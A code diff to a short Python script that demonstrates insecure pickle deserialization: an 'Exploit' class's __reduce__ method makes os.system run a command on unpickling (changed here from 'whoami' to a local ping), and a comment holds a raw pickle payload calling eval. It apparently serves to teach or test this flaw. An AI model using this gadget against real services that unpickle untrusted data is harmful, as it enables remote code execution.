@@ -3,16 +3,16 @@ import pickle
 from base64 import b64encode, b64decode
 
 
-USER = {
-    "name": "Joe User",
-    "role": "user"
-}
+USER = {"name": "Joe User", "role": "user"}
 # USER_MAL = b'c__builtin__\neval\n(Vprint("It worked.")\ntR.'
+
 
 class Exploit(object):
     def __reduce__(self):
         import os
-        return(os.system,(b"whoami", ))
+
+        return (os.system, (b"ping -c 2 127.0.0.1",))
+
 
 USER_MAL = Exploit()
 user = b64encode(pickle.dumps(USER))
